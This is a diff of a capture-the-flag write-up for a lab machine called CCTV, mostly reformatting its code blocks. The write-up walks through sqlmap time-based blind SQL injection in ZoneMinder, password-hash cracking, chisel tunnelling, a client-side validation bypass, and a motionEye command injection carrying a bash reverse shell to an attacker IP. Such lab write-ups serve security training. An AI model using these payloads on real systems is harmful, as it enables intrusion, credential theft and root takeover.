@@ -26,21 +26,20 @@ tags:
 
 ### 💻 Target Information
 - **Machine Name:** CCTV
-- **Operating System:** Linux (Ubuntu)
+- **Operating System:** Linux
 - **Difficulty:** Easy
 - **Vulnerabilities:** SQL Injection in ZoneMinder (CVE-2024-51428), OS Command Injection in motionEye (CVE-2025-60787)
 
 ---
 
-```text
-\-------------------------------------------------------------------------------------CCTV Notes---------------------------------------------------------------------------------------------
-```
 
 ## Step 1 - Reconnaissance
 
 ```bash
 nmap -A -sS -P -T4  --min-rate 5000 10.129.5.203
+```
 
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-13 14:10 UTC
 
 Nmap scan report for 10.129.5.203
@@ -124,8 +123,6 @@ Nmap done: 1 IP address (1 host up) scanned in 98.18 seconds
 
 ```text
 Unlike traditional SQL injection, which displays database data directly on the page, time-based attacks are used when the application suppresses error messages and does not return any data in the response, making it "blind".
-
-&#x20;
 ```
 
 > [!NOTE]
@@ -145,8 +142,6 @@ Data Extraction: By repeatedly asking questions (e.g., "Is the first character o
 
 ```text
 **[^] Web Login Page Username and Password is---> admin**
-
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
 ## Step 2 - Initial Foothold
@@ -156,21 +151,23 @@ Data Extraction: By repeatedly asking questions (e.g., "Is the first character o
 ```bash
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\
 
-&#x20;   --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \\
+    --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \\
 
-&#x20;   -p tid --dbms=mysql --batch
+    -p tid --dbms=mysql --batch
+```
 
-&#x20;       ___
+```text
+___
 
-&#x20;      __H__
+       __H__
 
-&#x20;___ ___["]_____ ___ ___  {1.9.6.1#dev}
+ ___ ___["]_____ ___ ___  {1.9.6.1#dev}
 
 |_ -| . [)]     | .'| . |
 
 |___|_  [.]_|_|_|__,|  _|
 
-&#x20;     |_|V...       |_|   https://sqlmap.org
+      |_|V...       |_|   https://sqlmap.org
 ```
 
 > [!IMPORTANT]
@@ -218,18 +215,22 @@ injection not exploitable with NULL values. Do you want to try with a random int
 [14:26:44] [INFO] checking if the injection point on GET parameter 'tid' is a false positive
 
 GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+```
 
+```bash
 sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
+```
 
+```text
 \---
 
 **Parameter: tid (GET)**
 
-&#x20;   **Type: time-based blind**
+    **Type: time-based blind**
 
-&#x20;   **Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)**
+    **Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)**
 
-&#x20;   **Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)**
+    **Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)**
 
 \---
 
@@ -270,21 +271,23 @@ back-end DBMS: MySQL >= 5.0.12
 ```bash
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\
 
-&#x20;   --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \\
+    --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \\
 
-&#x20;      -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump
+       -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump
+```
 
-&#x20;       ___
+```text
+___
 
-&#x20;      __H__
+       __H__
 
-&#x20;___ ___[']_____ ___ ___  {1.9.6.1#dev}
+ ___ ___[']_____ ___ ___  {1.9.6.1#dev}
 
 |_ -| . [']     | .'| . |
 
 |___|_  [(]_|_|_|__,|  _|
 
-&#x20;     |_|V...       |_|   https://sqlmap.org
+      |_|V...       |_|   https://sqlmap.org
 ```
 
 > [!IMPORTANT]
@@ -294,18 +297,22 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 [*] starting @ 14:52:36 /2026-03-13/
 
 [14:52:36] [INFO] testing connection to the target URL
+```
 
+```bash
 sqlmap resumed the following injection point(s) from stored session:
+```
 
+```text
 \---
 
 Parameter: tid (GET)
 
-&#x20;   Type: time-based blind
+    Type: time-based blind
 
-&#x20;   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
 
-&#x20;   Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)
+    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)
 
 \---
 
@@ -393,21 +400,23 @@ Table: Users
 ```bash
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\
 
-&#x20;   --cookie="ZMSESSID=gl5bdpecie4ug6sb2bet115ovk" \\    
+    --cookie="ZMSESSID=gl5bdpecie4ug6sb2bet115ovk" \\    
 
-&#x20;   -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
+    -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
+```
 
-&#x20;       ___
+```text
+___
 
-&#x20;      __H__
+       __H__
 
-&#x20;___ ___[,]_____ ___ ___  {1.9.6.1#dev}
+ ___ ___[,]_____ ___ ___  {1.9.6.1#dev}
 
 |_ -| . [)]     | .'| . |
 
 |___|_  ["]_|_|_|__,|  _|
 
-&#x20;     |_|V...       |_|   https://sqlmap.org
+      |_|V...       |_|   https://sqlmap.org
 ```
 
 > [!IMPORTANT]
@@ -417,18 +426,22 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 [*] starting @ 13:55:56 /2026-03-14/
 
 [13:55:57] [INFO] testing connection to the target URL
+```
 
+```bash
 sqlmap resumed the following injection point(s) from stored session:
+```
 
+```text
 \---
 
 Parameter: tid (GET)
 
-&#x20;   Type: time-based blind
+    Type: time-based blind
 
-&#x20;   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
 
-&#x20;   Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)
+    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)
 
 \---
 
@@ -490,7 +503,7 @@ LyQaok0hq0
 
 [14:00:09] [ERROR] unable to properly validate last character value ('')..
 
-&#x20;  7AJ
+   7AJ
 
 [14:00:35] [ERROR] invalid character detected. retrying..
 
@@ -540,8 +553,6 @@ Table: Users
 ```text
 **$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame**
 
-&#x20;                                                         
-
 Session..........: hashcat
 
 Status...........: Cracked
@@ -587,40 +598,42 @@ Stopped: Sat Mar 14 14:30:48 2026
 
 ```bash
 ssh mark@cctv.htb
+```
 
+```text
 mark@cctv.htb's password: 
 
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
 
-&#x20;* Documentation:  https://help.ubuntu.com
+ * Documentation:  https://help.ubuntu.com
 
-&#x20;* Management:     https://landscape.canonical.com
+ * Management:     https://landscape.canonical.com
 
-&#x20;* Support:        https://ubuntu.com/pro
+ * Support:        https://ubuntu.com/pro
 
-&#x20;System information as of Sat 14 Mar 13:56:50 UTC 2026
+ System information as of Sat 14 Mar 13:56:50 UTC 2026
 
-&#x20; System load:           0.24
+  System load:           0.24
 
-&#x20; Usage of /:            72.5% of 8.70GB
+  Usage of /:            72.5% of 8.70GB
 
-&#x20; Memory usage:          27%
+  Memory usage:          27%
 
-&#x20; Swap usage:            0%
+  Swap usage:            0%
 
-&#x20; Processes:             256
+  Processes:             256
 
-&#x20; Users logged in:       0
+  Users logged in:       0
 
-&#x20; IPv4 address for eth0: 10.129.6.105
+  IPv4 address for eth0: 10.129.6.105
 
-&#x20; IPv6 address for eth0: dead:beef::250:56ff:feb0:da46
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:da46
 
-&#x20;* Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
 
-&#x20;  just raised the bar for easy, resilient and secure K8s cluster deployment.
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
 
-&#x20;  https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
 
 Expanded Security Maintenance for Applications is not enabled.
 
@@ -633,7 +646,9 @@ Learn more about enabling ESM Apps service at https://ubuntu.com/esm
 The list of available updates is more than a week old.
 
 To check for new updates run: sudo apt update
+```
 
+```bash
 mark@cctv:~$
 ```
 
@@ -644,9 +659,9 @@ tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN
 
 motioneye.service                        loaded active running motionEye Server
 
-&#x20; Potential issue in service: motioneye.service
+  Potential issue in service: motioneye.service
 
-&#x20; └─ RUNS_AS_ROOT: Service runs as root
+  └─ RUNS_AS_ROOT: Service runs as root
 ```
 
 - 🔍 *As its an internal Port, and listening on an internal localhost. so we gotta tunnel it up*
@@ -655,7 +670,7 @@ motioneye.service                        loaded active running motionEye Server
 > On Attacker Machine--->
 
 ```text
-&#x20;./chisel-lin server --port 8099 --reverse --socks5
+./chisel-lin server --port 8099 --reverse --socks5
 
 2026/03/14 15:07:46 server: Reverse tunnelling enabled
 
@@ -671,9 +686,11 @@ motioneye.service                        loaded active running motionEye Server
 > [!IMPORTANT]
 > On target--->
 
-```text
+```bash
 mark@cctv:~$ ./chisel-lin client 10.10.14.****:8098 R:7999:127.0.0.1:7999
+```
 
+```text
 2026/03/14 15:22:21 client: Connecting to ws://10.10.14.****:8098
 
 2026/03/14 15:22:23 client: Connected (Latency 264.663554ms)
@@ -683,19 +700,25 @@ mark@cctv:~$ ./chisel-lin client 10.10.14.****:8098 R:7999:127.0.0.1:7999
 
 - 🔍 *Once Tunneling is done, get the shell with*
 
-```text
-&#x20;ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
+```bash
+ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
 ```
 
 - 🔍 *Once its done, go to /etc/motioneye, and there you'll find it's configuration file*
 
-```text
+```bash
 mark@cctv:/etc/motioneye$ ls
+```
 
+```text
 camera-1.conf  motion.conf  motioneye.conf
+```
 
+```bash
 mark@cctv:/etc/motioneye$ cat motion.conf
+```
 
+```text
 # @admin_username admin
 
 # **@normal_username user**
@@ -737,10 +760,6 @@ MotionEye v0.43.1b4 and before is vulnerable to OS Command Injection in configur
 
 - 🔍 *means we can concatenate a shell command in the image_file_name parameter/user-field, and due to unsanitized validation of this field, the server can execute our shell command.*
 
-```text
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-```
-
 ## Step 3 - Privilege Escalation
 
 - 🔍 *As we got the vulnerability, now lets make the attack chain*
@@ -759,7 +778,7 @@ MotionEye v0.43.1b4 and before is vulnerable to OS Command Injection in configur
 
 - 🔍 *Once done, Then we have do the client side validation bypass*
 
-- 🔍 *What's that? The web UI attempts to block shell syntax in fields like Image File Name using a JavaScript function configUiValid(). This can be bypassed by overriding the function in the browser console (F12):*
+- 🎯 **What's that? The web UI attempts to block shell syntax in fields like Image File Name using a JavaScript function configUiValid(). This can be bypassed by overriding the function in the browser console (F12):**
 
 ```text
 configUiValid = function() { return true; };
@@ -769,7 +788,7 @@ configUiValid = function() { return true; };
 
 - 🔍 *once done write this in the image_file_name input field*
 
-```bash
+```text
 $(python3 -c "import os;os.system('bash -c \\"bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1\\"')").%Y-%m-%d-%H-%M-%S
 ```
 
@@ -777,9 +796,11 @@ $(python3 -c "import os;os.system('bash -c \\"bash -i >& /dev/tcp/<attacker_ip>/
 
 - 🔍 *Trigger it via ---> curl "http://127.0.0.1:7999/1/action/snapshot"*
 
-```text
-&#x20;curl "http://127.0.0.1:7999/1/action/snapshot"
+```bash
+curl "http://127.0.0.1:7999/1/action/snapshot"
+```
 
+```text
 Snapshot for camera 1 
 
 Done
@@ -797,11 +818,14 @@ connect to [10.10.14.****] from (UNKNOWN) [10.129.244.156] 36722
 bash: cannot set terminal process group (3081): Inappropriate ioctl for device
 
 bash: no job control in this shell
+```
 
+```bash
 root@cctv:/etc/motioneye#
 ```
 
 - 🔍 *Rooted!, User Flag is in /home/sa_mark, and root in default location. Enjoy!*
+
 
 ## Mitigations & Security Perspective
 
